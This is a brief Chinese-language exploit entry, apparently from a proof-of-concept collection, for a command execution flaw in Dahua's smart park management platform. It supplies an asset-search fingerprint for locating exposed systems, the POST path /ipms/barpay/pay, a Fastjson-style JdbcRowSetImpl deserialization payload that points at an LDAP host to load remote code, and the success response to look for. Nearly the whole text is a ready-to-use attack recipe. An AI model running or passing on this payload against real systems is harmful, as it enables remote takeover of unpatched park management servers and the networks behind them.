# 大华智慧园区综合管理平台ipms_barpay_payRCE漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /ipms/barpay/pay HTTP/1.1`

**Payload**
```
{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://www.baidu.com", "autoCommit": true}
```
- **响应特征**：200